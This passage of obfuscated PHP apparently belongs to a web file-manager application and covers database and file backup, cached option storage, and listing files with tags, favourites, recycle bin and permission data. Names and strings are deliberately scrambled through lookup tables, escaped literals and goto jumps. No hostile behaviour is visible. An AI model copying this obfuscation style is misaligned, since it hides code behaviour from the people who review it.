$ÄŞ¤ÉÇ¿[89]) { return !0; } $¨Úµ÷ü« = new BackupDbFile(); if (!$¨Úµ÷ü«->index()) { return !1; } self::set(array($ÄŞ¤ÉÇ¿[775] => 1)); return !0; } public function file() { $†åË½ =& $_SERVER[Ãìšã«™]; $´ûèåŸì = self::get(); if ($´ûèåŸì[$†åË½[288]][$†åË½[192]][$†åË½[751]] == $†åË½[89]) { return !0; } if (!isset($´ûèåŸì[$†åË½[756]]) || $´ûèåŸì[$†åË½[756]] == $†åË½[190]) { $ªØƒÖöº = new BackupFile(); if (!$ªØƒÖöº->index()) { return !1; } } self::set(array($†åË½[776] => 1, $†åË½[751] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ñÍµêé =& $_SERVER[Ãìšã«™]; $’¦Œ›î = Backup::get(); self::$io = $’¦Œ›î[$ñÍµêé[753]]; self::$name = $’¦Œ›î[$ñÍµêé[32]]; $¾ãåŸ¨ò = new DbManage(); $‰Æ»ÔÖ½ = $¾ãåŸ¨ò->dbType(); $ŒşúÀšæ = array($ñÍµêé[777] => $‰Æ»ÔÖ½, $ñÍµêé[778] => time()); Backup::set($ŒşúÀšæ); $Úº‘¿«¶ = $this->tmpFilesPath() . $ñÍµêé[779] . self::$name . $ñÍµêé[8]; del_dir($Úº‘¿«¶); mk_dir($Úº‘¿«¶); $ùåÁÎûõ = $öÁ‡İ×· = 0; $ííïÊû = new Task($ñÍµêé[780], $ñÍµêé[781], 0, LNG($ñÍµêé[782]) . $ñÍµêé[783] . LNG($ñÍµêé[784])); try { $¢ Æ×ô” = $¾ãåŸ¨ò->db()->getTables(); } catch (Exception $÷ÚÔÌ”) { $ííïÊû->end(); return !1; } $¢ Æ×ô” = array_diff($¢ Æ×ô”, array($ñÍµêé[785], $ñÍµêé[786])); foreach ($¢ Æ×ô” as $Ã‘¹à‚À) { $ùåÁÎûõ += $¾ãåŸ¨ò->model($Ã‘¹à‚À)->count(); } $ííïÊû->task[$ñÍµêé[787]] = $ùåÁÎûõ; $GLOBALS[$ñÍµêé[788]] = self::$name; foreach ($¢ Æ×ô” as $Ã‘¹à‚À) { $¬ÓàÎ¦Å = $Úº‘¿«¶ . $Ã‘¹à‚À . $ñÍµêé[789]; $ğÖç†±û = null; if ($Ã‘¹à‚À == $ñÍµêé[790] && (!isset($’¦Œ›î[$ñÍµêé[756]]) || $’¦Œ›î[$ñÍµêé[756]] == $ñÍµêé[190])) { $ğÖç†±û = self::$io; } $öÁ‡İ×· += $¾ãåŸ¨ò->sqlFromDb($Ã‘¹à‚À, $¬ÓàÎ¦Å, $ííïÊû, $ğÖç†±û); } unset($GLOBALS[$ñÍµêé[788]]); $ííïÊû->end(); if ($öÁ‡İ×· > $ùåÁÎûõ) { $ùåÁÎûõ = $öÁ‡İ×·; } $ŒşúÀšæ = array($ñÍµêé[777] => $‰Æ»ÔÖ½, $ñÍµêé[774] => 1, $ñÍµêé[791] => $ùåÁÎûõ, $ñÍµêé[792] => $öÁ‡İ×·, $ñÍµêé[793] => time()); Backup::set($ŒşúÀšæ); if ($ùåÁÎûõ - $öÁ‡İ×· > 0) { $óŞŠŒ´× = $ñÍµêé[794]; if (stristr(I18n::getType(), $ñÍµêé[795])) { $óŞŠŒ´× = $ñÍµêé[796]; } write_log(array($óŞŠŒ´×, $ŒşúÀšæ), $ñÍµêé[781]); return !1; } return !0; } private function tmpFilesPath() { $ÄÏ¯êÀ€ =& $_SERVER[Ãìšã«™]; $‚ùÉºÃÀ = TEMP_FILES; if ($GLOBALS[$ÄÏ¯êÀ€[6]][$ÄÏ¯êÀ€[90]][$ÄÏ¯êÀ€[797]]) { $‚ùÉºÃÀ = $GLOBALS[$ÄÏ¯êÀ€[6]][$ÄÏ¯êÀ€[90]][$ÄÏ¯êÀ€[797]]; if (!mk_dir($‚ùÉºÃÀ) || !is_writable($‚ùÉºÃÀ) || !IO::mkfile($‚ùÉºÃÀ . $ÄÏ¯êÀ€[798])) { $‚ùÉºÃÀ = TEMP_FILES; } } return $‚ùÉºÃÀ; } } goto FÎ‘ìÎÆÚÀ; B‚õ½ÁÁëà: define($_SERVER[Ãìšã«™][236], 1); define($_SERVER[Ãìšã«™][237], 0); define($_SERVER[Ãìšã«™][238], 2); goto dÉ’ÏñÕÈè; dŸÎ¢™Øí: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ƒôË•Ø¶ = false, $æÓö¹˜ = '', $‹ğªı§ø = false) { $ëŞõåö =& $_SERVER[Ãìšã«™]; $ÇÎÂÑîÍ = $this->cacheGet($æÓö¹˜); $ â´œ‘¥ = $this->optionDefault($æÓö¹˜); $ â´œ‘¥ = is_array($ â´œ‘¥) ? $ â´œ‘¥ : array(); if (is_array($ÇÎÂÑîÍ)) { $ÇÎÂÑîÍ = array_merge($ â´œ‘¥, $ÇÎÂÑîÍ); return $ƒôË•Ø¶ ? isset($ÇÎÂÑîÍ[$ƒôË•Ø¶]) ? $ÇÎÂÑîÍ[$ƒôË•Ø¶] : null : $ÇÎÂÑîÍ; } $ö¾ˆÌ–‰ = $this->filterWhere(array($ëŞõåö[33] => $æÓö¹˜)); $ÇÎÂÑîÍ = $this->where($ö¾ˆÌ–‰)->select(); $ÇÎÂÑîÍ = array_to_keyvalue($ÇÎÂÑîÍ, $ëŞõåö[95], $ëŞõåö[369]); foreach ($ÇÎÂÑîÍ as $í«¾– => $Ï¨û½Í½) { if ($‹ğªı§ø || in_array($í«¾–, $this->jsonField)) { $ÇÎÂÑîÍ[$í«¾–] = json_decode($Ï¨û½Í½, !0); } } $this->cacheSet($æÓö¹˜, $ÇÎÂÑîÍ); $ÇÎÂÑîÍ = array_merge($ â´œ‘¥, $ÇÎÂÑîÍ); return $ƒôË•Ø¶ ? $ÇÎÂÑîÍ[$ƒôË•Ø¶] : $ÇÎÂÑîÍ; } public function set($Ì°ØÚ·ì, $¼ÈæÛ³Æ = false, $Ìò“öÆ¾ = '') { $’¯ïÃØŒ =& $_SERVER[Ãìšã«™]; $this->cacheRemove($Ìò“öÆ¾); $‘´’£ı = array(); $°œ¥øç¢ = is_array($Ì°ØÚ·ì) ? $Ì°ØÚ·ì : array($Ì°ØÚ·ì => $¼ÈæÛ³Æ); foreach ($°œ¥øç¢ as $Ì»šÅ => $Ö°ğ‘Ç) { if (is_array($Ö°ğ‘Ç)) { $Ö°ğ‘Ç = json_encode_force($Ö°ğ‘Ç); } $this->checkLength($Ö°ğ‘Ç, !1, $this->tableName . $’¯ïÃØŒ[4] . $Ì°ØÚ·ì); $Ö°ğ‘Ç = self::textEncode($Ö°ğ‘Ç); $°œ¥øç¢ = array($’¯ïÃØŒ[33] => $Ìò“öÆ¾, $’¯ïÃØŒ[95] => $Ì»šÅ, $’¯ïÃØŒ[369] => $Ö°ğ‘Ç); $‘´’£ı[] = $this->filterWhere($°œ¥øç¢); } if (!$‘´’£ı) { return !0; } return $this->addAll($‘´’£ı, array(), !0); } protected function optionDefault($ÍÔ½º‚Ü = '') { return !1; } public function setDeep($ºÛ…Ï²Ğ, $úïÉ‘ß = false, $Æ¯Ëç¡ = '') { $ ¨™•õÇ = explode($_SERVER[Ãìšã«™][10], $ºÛ…Ï²Ğ); $ßš›Ç‡ = $this->get(); array_set_value($ßš›Ç‡, $ºÛ…Ï²Ğ, $úïÉ‘ß); $this->set($ ¨™•õÇ[0], $ßš›Ç‡[$ ¨™•õÇ[0]], $Æ¯Ëç¡); } public function remove($ã˜Ï¤¯×, $şÊÎşê¶ = '') { $ŠšŞˆ¯ñ =& $_SERVER[Ãìšã«™]; $this->cacheRemove($şÊÎşê¶); $Úáè˜Šı = $this->filterWhere(array($ŠšŞˆ¯ñ[95] => $ã˜Ï¤¯×, $ŠšŞˆ¯ñ[33] => $şÊÎşê¶)); if (is_null($ã˜Ï¤¯×)) { unset($Úáè˜Šı[$ŠšŞˆ¯ñ[95]]); } return $this->where($Úáè˜Šı)->delete(); } public function cacheSet($˜—Áì¯Ç, $Ãîœ¸ºï = false) { return Cache::set($this->cacheKey($˜—Áì¯Ç), $Ãîœ¸ºï); } public function cacheGet($Ú¹ñûŒ¹) { return Cache::get($this->cacheKey($Ú¹ñûŒ¹)); } public function cacheRemove($­†ƒå·Í) { return Cache::remove($this->cacheKey($­†ƒå·Í)); } protected function filterWhere($îçÃÉŞ’) { return $îçÃÉŞ’; } protected function cacheKey($Ğ”Äßë) { return $Ğ”Äßë; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\145"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\145" => "\x69\x6f\x5f\x73\x6f\x75\x72\143\145\137\155\x65\x74\141", "\155\x65\x74\141\x46\151\x65\154\144" => "\163\157\165\x72\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\151\x6d\145", "\x74\151\155\145", "\x69\156\163\145\x72\164", "\x66\165\x6e\x63\x74\x69\157\156"), array("\x63\x72\145\x61\164\x65\x54\151\x6d\145", "\x74\151\155\x65", "\151\x6e\163\x65\162\164", "\146\165\156\x63\x74\x69\x6f\156"), array("\x76\151\145\x77\124\151\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\x6e\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ûÚ¨ªã) { return $this->listSource(array($_SERVER[Ãìšã«™][402] => $ûÚ¨ªã)); } public function typeName($ù–ˆ”€) { static $£Õ¨è´® = array(self::TYPE_SYSTEM => "\163\171\163\x74\x65\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\x67\162\157\x75\x70"); return $£Õ¨è´®[$ù–ˆ”€ . $_SERVER[Ãìšã«™][12]]; } public function sourceListInfo($¨»¾ÇşÆ, $®®˜Úªº = false) { $—ø”¿Ù =& $_SERVER[Ãìšã«™]; $¨»¾ÇşÆ = $¨»¾ÇşÆ ? $¨»¾ÇşÆ : array(); $¨»¾ÇşÆ = array_filter(array_unique($¨»¾ÇşÆ)); if (!$¨»¾ÇşÆ) { return array(); } $šù¦îœ = $this->where(array($—ø”¿Ù[403] => array($—ø”¿Ù[7], $¨»¾ÇşÆ)))->select(); $this->_listDataApply($šù¦îœ, $®®˜Úªº); return array_to_keyvalue($šù¦îœ, $—ø”¿Ù[403]); } public function pathInfoFilter(&$´«÷³ôå) { $Œ½–¬¯ =& $_SERVER[Ãìšã«™]; static $Ó²“äÚ¤ = false; static $ºäŞãê = false; static $¡‡³ìœä = false; if (!$Ó²“äÚ¤) { $ÁûË¹ = $Œ½–¬¯[404]; $ÁûË¹ .= $Œ½–¬¯[405]; $ÁûË¹ .= $Œ½–¬¯[406]; $´œÒ¦˜Ã = $Œ½–¬¯[407]; $‘üÌïÌ = explode($Œ½–¬¯[50], $´œÒ¦˜Ã); $Ó²“äÚ¤ = explode($Œ½–¬¯[50], $ÁûË¹); $ºäŞãê = array(); foreach ($Ó²“äÚ¤ as $Õ‡„ÆÈÑ) { if (in_array($Õ‡„ÆÈÑ, $‘üÌïÌ)) { continue; } $ºäŞãê[] = $Õ‡„ÆÈÑ; } $¡‡³ìœä = explode($Œ½–¬¯[50], $Œ½–¬¯[408]); } foreach ($¡‡³ìœä as $˜¼õÖë) { if (isset($´«÷³ôå[$˜¼õÖë])) { $´«÷³ôå[$˜¼õÖë] = intval($´«÷³ôå[$˜¼õÖë]); } } $´«÷³ôå[$Œ½–¬¯[78]] = $Œ½–¬¯[409] . $´«÷³ôå[$Œ½–¬¯[403]] . $Œ½–¬¯[410]; $´«÷³ôå[$Œ½–¬¯[33]] = $´«÷³ôå[$Œ½–¬¯[411]] == 1 ? $Œ½–¬¯[79] : $Œ½–¬¯[192]; $´«÷³ôå[$Œ½–¬¯[412]] = $this->typeName($´«÷³ôå[$Œ½–¬¯[412]]); if ($´«÷³ôå[$Œ½–¬¯[411]] != 1) { $´«÷³ôå[$Œ½–¬¯[167]] = $´«÷³ôå[$Œ½–¬¯[413]]; unset($´«÷³ôå[$Œ½–¬¯[413]]); } $“ã’¸ = $Ó²“äÚ¤; if (isset($´«÷³ôå[$Œ½–¬¯[414]]) && $´«÷³ôå[$Œ½–¬¯[414]][$Œ½–¬¯[415]] == -1) { $“ã’¸ = $ºäŞãê; } $´«÷³ôå = array_field_key($´«÷³ôå, $“ã’¸); return $´«÷³ôå; } public function listUserFav() { $ÓêÄÙüÙ =& $_SERVER[Ãìšã«™]; $Ûû¢»§÷ = Model($ÓêÄÙüÙ[416])->listData(); $Ì•ÄÑÙ‡ = array_filter_by_field($Ûû¢»§÷, $ÓêÄÙüÙ[33], $ÓêÄÙüÙ[417]); $Ì•ÄÑÙ‡ = array_to_keyvalue($Ì•ÄÑÙ‡, $ÓêÄÙüÙ[12], $ÓêÄÙüÙ[78]); if ($Ì•ÄÑÙ‡) { $ëúŸ¨ƒ = $this->listSource(array($ÓêÄÙüÙ[418] => array($ÓêÄÙüÙ[419], $Ì•ÄÑÙ‡))); } $ëúŸ¨ƒ = array_to_keyvalue($ëúŸ¨ƒ[$ÓêÄÙüÙ[364]], $ÓêÄÙüÙ[403]); foreach ($Ûû¢»§÷ as &$¯öĞ¯‹) { $¯öĞ¯‹ = array($ÓêÄÙüÙ[420] => $¯öĞ¯‹[$ÓêÄÙüÙ[392]], $ÓêÄÙüÙ[421] => $¯öĞ¯‹[$ÓêÄÙüÙ[32]], $ÓêÄÙüÙ[422] => $¯öĞ¯‹[$ÓêÄÙüÙ[78]], $ÓêÄÙüÙ[423] => $¯öĞ¯‹[$ÓêÄÙüÙ[33]], $ÓêÄÙüÙ[424] => $¯öĞ¯‹[$ÓêÄÙüÙ[193]], $ÓêÄÙüÙ[425] => $¯öĞ¯‹[$ÓêÄÙüÙ[86]]); if ($¯öĞ¯‹[$ÓêÄÙüÙ[33]] == $ÓêÄÙüÙ[417] && $ëúŸ¨ƒ[$¯öĞ¯‹[$ÓêÄÙüÙ[78]]]) { $¯öĞ¯‹[$ÓêÄÙüÙ[87]] = $ëúŸ¨ƒ[$¯öĞ¯‹[$ÓêÄÙüÙ[78]]]; } } unset($¯öĞ¯‹); return $Ûû¢»§÷; } public function listUserTag($Æ–Çñªò) { $¥ÀÚ¤ùÁ =& $_SERVER[Ãìšã«™]; if ($Æ–Çñªò && !is_array($Æ–Çñªò)) { $Æ–Çñªò = array($Æ–Çñªò); } $â‹¶õŸå = Model($¥ÀÚ¤ùÁ[426])->listData(); $ûÌÇ÷™ı = array(); foreach ($â‹¶õŸå as $¢­èš´Ø) { $ëç•™ıà = $¢­èš´Ø[$¥ÀÚ¤ùÁ[78]]; if (!$ëç•™ıà) { continue; } if (!isset($ûÌÇ÷™ı[$ëç•™ıà])) { $ûÌÇ÷™ı[$ëç•™ıà] = array(); } $ûÌÇ÷™ı[$ëç•™ıà][] = $¢­èš´Ø[$¥ÀÚ¤ùÁ[427]]; } $ªõæÛ†Å = array(); foreach ($ûÌÇ÷™ı as $ªäÀÎŠ° => $µÔÓ¨Ä) { $²ÈØ„¡‡ = !0; if (!$Æ–Çñªò) { $ªõæÛ†Å[] = $ªäÀÎŠ°; continue; } foreach ($Æ–Çñªò as $ºşöÛ¥„) { if (!in_array($ºşöÛ¥„, $µÔÓ¨Ä)) { $²ÈØ„¡‡ = !1; break; } } if ($²ÈØ„¡‡) { $ªõæÛ†Å[] = $ªäÀÎŠ°; } } if (!$ªõæÛ†Å) { return array(); } $¸†ÈëÊ¾ = $this->listSource(array($¥ÀÚ¤ùÁ[418] => array($¥ÀÚ¤ùÁ[419], $ªõæÛ†Å))); if (!$¸†ÈëÊ¾ || count($ªõæÛ†Å) == $¸†ÈëÊ¾[$¥ÀÚ¤ùÁ[361]][$¥ÀÚ¤ùÁ[362]]) { return $¸†ÈëÊ¾; } $ØòÑŞé¤ = array(); $æäÂæ›ˆ = array_to_keyvalue($¸†ÈëÊ¾[$¥ÀÚ¤ùÁ[77]], $¥ÀÚ¤ùÁ[12], $¥ÀÚ¤ùÁ[403]); $Öõùí = array_to_keyvalue($¸†ÈëÊ¾[$¥ÀÚ¤ùÁ[76]], $¥ÀÚ¤ùÁ[12], $¥ÀÚ¤ùÁ[403]); $‡¯ùŞ³ë = array_merge($Öõùí, $æäÂæ›ˆ); foreach ($ªõæÛ†Å as $ëç•™ıà) { if (!in_array($ëç•™ıà, $‡¯ùŞ³ë)) { $ØòÑŞé¤[] = $ëç•™ıà; } } if ($ØòÑŞé¤) { Model($¥ÀÚ¤ùÁ[428])->removeBySource($ØòÑŞé¤); } return $¸†ÈëÊ¾; } public function listUserRecycle() { $ìªŠŒú» =& $_SERVER[Ãìšã«™]; $ÓØÉéÈĞ = Model($ìªŠŒú»[429])->listData(); if (!$ÓØÉéÈĞ) { return array(); } $£ë¾”„… = array($ìªŠŒú»[418] => array($ìªŠŒú»[419], $ÓØÉéÈĞ), $ìªŠŒú»[430] => 1); return $this->listSource($£ë¾”„…); } public function listSource($›†ùÙ×æ, $¯Š¥Ú¯ = 3000) { $ÍÓ÷ó§Â =& $_SERVER[Ãìšã«™]; if (!isset($›†ùÙ×æ[$ÍÓ÷ó§Â[431]])) { $›†ùÙ×æ[$ÍÓ÷ó§Â[431]] = 0; } $ÄõŸĞ¬ = $ÍÓ÷ó§Â[432]; $ËÂåšãü = $this->field($ÄõŸĞ¬)->_makeOrder()->where($›†ùÙ×æ)->selectPage($¯Š¥Ú¯); $this->_listPageCheck($ËÂåšãü, $ÄõŸĞ¬, $›†ùÙ×æ); $this->_listDataApply($ËÂåšãü[$ÍÓ÷ó§Â[364]]); $this->_listMake($ËÂåšãü); return $ËÂåšãü; } private function _listPageCheck(&$ÈÎöˆµì, $­İö±Úš, $¾¡ûÙ­Ğ) { $Ì‚“˜Í =& $_SERVER[Ãìšã«™]; if (!is_array($ÈÎöˆµì[$Ì‚“˜Í[361]])) { return; } $ˆÍäÄ« = $ÈÎöˆµì[$Ì‚“˜Í[361]]; if ($ˆÍäÄ«[$Ì‚“˜Í[363]] <= 1) { return; } if ($ˆÍäÄ«[$Ì‚“˜Í[362]] >= 100000) { return; } if (Model($Ì‚“˜Í[433])->get($Ì‚“˜Í[434]) != $Ì‚“˜Í[435]) { return; } $­İö±Úš = str_replace(array($Ì‚“˜Í[53], $Ì‚“˜Í[337], $Ì‚“˜Í[226]), $Ì‚“˜Í[12], $­İö±Úš); $­İö±Úš = $Ì‚“˜Í[436] . str_replace($Ì‚“˜Í[50], $Ì‚“˜Í[437], $­İö±Úš) . $Ì‚“˜Í[438]; $²İŞ¿ = $Ì‚“˜Í[439]; $²İŞ¿ = $²İŞ¿ . $Ì‚“˜Í[440]; $ÀÈ¡¯Åš = $ˆÍäÄ«[$Ì‚“˜Í[358]] * ($ˆÍäÄ«[$Ì‚“˜Í[348]] - 1) . $Ì‚“˜Í[50] . $ˆÍäÄ«[$Ì‚“˜Í[358]]; $øêÏ”•Å = $this->_makeOrder(!0); $ƒ²—‘Ò = $Ì‚“˜Í[436] . str_replace($Ì‚“˜Í[50], $Ì‚“˜Í[437], $øêÏ”•Å[0]); if (strpos($ƒ²—‘Ò, $Ì‚“˜Í[441])) { $ƒ²—‘Ò = str_replace($Ì‚“˜Í[441], $Ì‚“˜Í[442], $ƒ²—‘Ò); } else { $ƒ²—‘Ò .= $Ì‚“˜Í[443] . $øêÏ”•Å[1]; } $³¶‘ì±ù = array(); foreach ($¾¡ûÙ­Ğ as $«ìË“½€ => $ËçÊ±¿÷) { $³¶‘ì±ù[$Ì‚“˜Í[436] . $«ìË“½€] = $ËçÊ±¿÷; } $this->alias($Ì‚“˜Í[444])->field($­İö±Úš)->limit($ÀÈ¡¯Åš)->order($ƒ²—‘Ò); $ÂÈƒ‘°Á = $this->join($²İŞ¿)->where($³¶‘ì±ù)->select(); if ($ÂÈƒ‘°Á) { $ÈÎöˆµì[$Ì‚“˜Í[364]] = $ÂÈƒ‘°Á; } } protected function _makeOrder($šÉ´ıó† = false) { $Ñê˜¡õ =& $_SERVER[Ãìšã«™]; $ÑÆ¨Ö“ = Model($Ñê˜¡õ[445])->get($Ñê˜¡õ[446]); $™‰ÈØÕÌ = Model($Ñê˜¡õ[445])->get($Ñê˜¡õ[447]); $’šŸîâü = array($Ñê˜¡õ[448] => $Ñê˜¡õ[449], $Ñê˜¡õ[450] => $Ñê˜¡õ[451]); $««ü‰¦ù = array($Ñê˜¡õ[32] => $Ñê˜¡õ[32], $Ñê˜¡õ[80] => $Ñê˜¡õ[80], $Ñê˜¡õ[167] => $Ñê˜¡õ[413], $Ñê˜¡õ[452] => $Ñê˜¡õ[452], $Ñê˜¡õ[453] => $Ñê˜¡õ[454], $Ñê˜¡õ[193] => $Ñê˜¡õ[193], $Ñê˜¡õ[86] => $Ñê˜¡õ[86]); $–½¥™İ° = Input::get($Ñê˜¡õ[455], $Ñê˜¡õ[7], $ÑÆ¨Ö“, array_keys($««ü‰¦ù)); $’îí·ôİ = Input::get($Ñê˜¡õ[456], $Ñê˜¡õ[7], $™‰ÈØÕÌ, array_keys($’šŸîâü)); if (!in_array($–½¥™İ°, array_keys($««ü‰¦ù))) { $–½¥™İ° = $Ñê˜¡õ[32]; } if (!in_array($’îí·ôİ, array_keys($’šŸîâü))) { $–½¥™İ° = $Ñê˜¡õ[448]; } if ($–½¥™İ° == $Ñê˜¡õ[32]) { } $Õ´æÄ˜½ = $Ñê˜¡õ[457] . $««ü‰¦ù[$–½¥™İ°] . $Ñê˜¡õ[53] . $’šŸîâü[$’îí·ôİ]; $Õ´æÄ˜½ = rtrim(trim($Õ´æÄ˜½), $Ñê˜¡õ[50]); if ($šÉ´ıó†) { return array($Õ´æÄ˜½, $’šŸîâü[$’îí·ôİ]); } return $this->order($Õ´æÄ˜½); } protected function _listDataApplyItem($²ËÎ¥†é, $ÚŸà®¹Ş = false) { $ÖËåØ®• = array($²ËÎ¥†é); $this->_listDataApply($ÖËåØ®•, $ÚŸà®¹Ş); return $ÖËåØ®•[0]; } protected function _listDataApply(&$œ£›Üò, $ÏõÙ“ŒÇ = false) { $®çıïœ =& $_SERVER[Ãìšã«™]; if (!$œ£›Üò) { $œ£›Üò = array(); return; } $ÖŠÕæø„ = array_to_keyvalue($œ£›Üò, $®çıïœ[12], $®çıïœ[403]); $ÖŠÕæø„ = array_unique($ÖŠÕæø„); $this->_listSourceCache($œ£›Üò); if (!$ÏõÙ“ŒÇ) { $this->_listAppendMeta($œ£›Üò, $ÖŠÕæø„); $this->_listAppendFileMeta($œ£›Üò, $ÖŠÕæø„); $this->_listAppendChildren($œ£›Üò, $ÖŠÕæø„); } $this->_listAppendPath($œ£›Üò); $this->_listAppendAuth($œ£›Üò); $this->_listAppendSourceInfo($œ£›Üò, $ÖŠÕæø„); $this->_listAppendUser($œ£›Üò); $this->_listFilterInfo($œ£›Üò, $ÏõÙ“ŒÇ); $this->_listAppendAuthSecret($œ£›Üò); } protected function _listSourceCache($Éç¡»ˆë) { $¸ãò´¶ =& $_SERVER[Ãìšã«™]; foreach ($Éç¡»ˆë as $ƒú‹¨İ°) { self::$cacheSourceInfo[$¸ãò´¶[458] . $ƒú‹¨İ°[$¸ãò´¶[403]]] = $ƒú‹¨İ°; } } protected function _listFilterInfo(&$Í‚ÅÀª, $‚æâºŸœ = false) { $ ˜†¥À‰ =& $_SERVER[Ãìšã«™]; foreach ($Í‚ÅÀª as &$¿ÒÓø·É) { $¿ÒÓø·É = $this->pathInfoFilter($¿ÒÓø·É); self::$cachePathInfo[$ ˜†¥À‰[459] . intval($‚æâºŸœ) . $ ˜†¥À‰[460] . $¿ÒÓø·É[$ ˜†¥À‰[403]]] = $¿ÒÓø·É; } unset($¿ÒÓø·É); } protected function _listMake(&$Ò™Á€¤) { $Ã°‹›ä» =& $_SERVER[Ãìšã«™]; $Ò™Á€¤[$Ã°‹›ä»[77]] = array(); $Ò™Á€¤[$Ã°‹›ä»[76]] = array(); foreach ($Ò™Á€¤[$Ã°‹›ä»[364]] as $³£®²—È) { $À²İ·â = $³£®²—È[$Ã°‹›ä»[411]] == 1 ? $Ã°‹›ä»[77] : $Ã°‹›ä»[76]; $Ò™Á€¤[$À²İ·â][] = $³£®²—È; } unset($Ò™Á€¤[$Ã°‹›ä»[364]]); } protected function _listAppendMeta(&$ô–ª£Æµ, $§ºÍ’×¾) { $¤èéã ö =& $_SERVER[Ãìšã«™]; $úİ£¬çâ = array($¤èéã ö[418] => array($¤èéã ö[419], $§ºÍ’×¾)); $óØºì® = Model($¤èéã ö[461])->field($¤èéã ö[462])->where($úİ£¬çâ)->select(); if (!$óØºì®) { return; } $ÈÖúóØ = array($¤èéã ö[463], $¤èéã ö[464], $¤èéã ö[442]); $Ô¬Ìï®ø = array(); foreach ($óØºì® as $¡ëÅ°æ†) { if (!isset($Ô¬Ìï®ø[$¡ëÅ°æ†[$¤èéã ö[403]]])) { $Ô¬Ìï®ø[$¡ëÅ°æ†[$¤èéã ö[403]]] = array(); } if (in_array($¡ëÅ°æ†[$¤èéã ö[95]], $ÈÖúóØ)) { continue; } $Ô¬Ìï®ø[$¡ëÅ°æ†[$¤èéã ö[403]]][$¡ëÅ°æ†[$¤èéã ö[95]]] = $¡ëÅ°æ†[$¤èéã ö[369]]; } foreach ($ô–ª£Æµ as &$–ÉÍ®ö×) { $–ÉÍ®ö×[$¤èéã ö[465]] = !1; if (isset($Ô¬Ìï®ø[$–ÉÍ®ö×[$¤èéã ö[403]]])) { $–ÉÍ®ö×[$¤èéã ö[465]] = $Ô¬Ìï®ø[$–ÉÍ®ö×[$¤èéã ö[403]]]; } if ($this->fileIsLock($–ÉÍ®ö×) && $–ÉÍ®ö×[$¤èéã ö[414]]) { $ÏßãßÑ» = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $–ÉÍ®ö×[$¤èéã ö[414]][$¤èéã ö[415]] = AuthModel::authDisable($–ÉÍ®ö×[$¤èéã ö[414]][$¤èéã ö[415]], $ÏßãßÑ»); $–ÉÍ®ö×[$¤èéã ö[414]][$¤èéã ö[466]][$¤èéã ö[414]] = $–ÉÍ®ö×[$¤èéã ö[414]][$¤èéã ö[415]]; } } unset($–ÉÍ®ö×); } protected function _listAppendFileMeta(&$ÓëÊ¸ó, $ğ¸êêÃı) { $„¬¹¦âò =& $_SERVER[Ãìšã«™]; $³ë÷å¥ = array_to_keyvalue($ÓëÊ¸ó, $„¬¹¦âò[12], $„¬¹¦âò[467]); $³ë÷å¥ = array_filter(array_unique($³ë÷å¥)); if (!$³ë÷å¥) { return; } $ã¼ğÁŠ = array($„¬¹¦âò[468] => array($„¬¹¦âò[419], $³ë÷å¥)); $³³¾¬ô› = $„¬¹¦âò[469]; $Ó’®øîš = Model($„¬¹¦âò[470])->field($³³¾¬ô›)->where($ã¼ğÁŠ)->select(); $Ó’®øîš = array_to_keyvalue($Ó’®øîš, $„¬¹¦âò[467]); $ôØêõ = Model($„¬¹¦âò[471])->field($„¬¹¦âò[472])->where($ã¼ğÁŠ)->select(); $ôØêõ = $ôØêõ ? $ôØêõ : array(); $Øºá¡Í = array(); foreach ($ôØêõ as $€íÌ•) { if (!isset($Øºá¡Í[$€íÌ•[$„¬¹¦âò[467]]])) { $Øºá¡Í[$€íÌ•[$„¬¹¦âò[467]]] = array(); } $Øºá¡Í[$€íÌ•[$„¬¹¦âò[467]]][$€íÌ•[$„¬¹¦âò[95]]] = $€íÌ•[$„¬¹¦âò[369]]; } foreach ($ÓëÊ¸ó as &$£¹ â«ú) { $å²®³ã‰ = $£¹ â«ú[$„¬¹¦âò[467]]; if (!$å²®³ã‰ || !is_array($Ó’®øîš[$å²®³ã‰])) { continue; } $‡·ğ¢şâ = $Ó’®øîš[$å²®³ã‰]; $‡·ğ¢şâ[$„¬¹¦âò[80]] = $£¹ â«ú[$„¬¹¦âò[80]]; $‡·ğ¢şâ[$„¬¹¦âò[32]] = $£¹ â«ú[$„¬¹¦âò[32]]; if (!isset(self::$cacheFileInfo[$„¬¹¦âò[473] . $å²®³ã‰])) { self::$cacheFileInfo[$„¬¹¦âò[473] . $å²®³ã‰] = array_merge(array(), $‡·ğ¢şâ); } unset($Ó’®øîš[$å²®³ã‰][$„¬¹¦âò[78]]); $ÔõùÉŞ— = is_array($Øºá¡Í[$å²®³ã‰]) ? $Øºá¡Í[$å²®³ã‰] : array(); $£¹ â«ú[$„¬¹¦âò[163]] = array_merge($ÔõùÉŞ—, $Ó’®øîš[$å²®³ã‰]); if (isset($£¹ â«ú[$„¬¹¦âò[163]][$„¬¹¦âò[162]])) { $£¹ â«ú[$„¬¹¦âò[162]] = json_decode($£¹ â«ú[$„¬¹¦âò[163]][$„¬¹¦âò[162]], !0); unset($£¹ â«ú[$„¬¹¦âò[163]][$„¬¹¦âò[162]]); } } unset($£¹ â«ú); } protected function _listAppendSourceInfo(&$ª£„ú“, $Â‹ È‡) { $Ò‘Ëú© =& $_SERVER[Ãìšã«™]; if (!defined($Ò‘Ëú©[474])) { return; } $ş™„èŞ¨ = Model($Ò‘Ëú©[475])->listData(); $ÍäÃËıÌ = Model($Ò‘Ëú©[426])->listData(); $ÔÑ£¦×ã = Model($Ò‘Ëú©[416])->listData(); $É…æÙ»Â = Model($Ò‘Ëú©[476])->listSimple(); $›¨½È = array_to_keyvalue($ş™„èŞ¨, $Ò‘Ëú©[392]); $¸Øßø = array_to_keyvalue_group($ÍäÃËıÌ, $Ò‘Ëú©[78], $Ò‘Ëú©[427]); $Ş¸ÊæŠ® = array_to_keyvalue($ÔÑ£¦×ã, 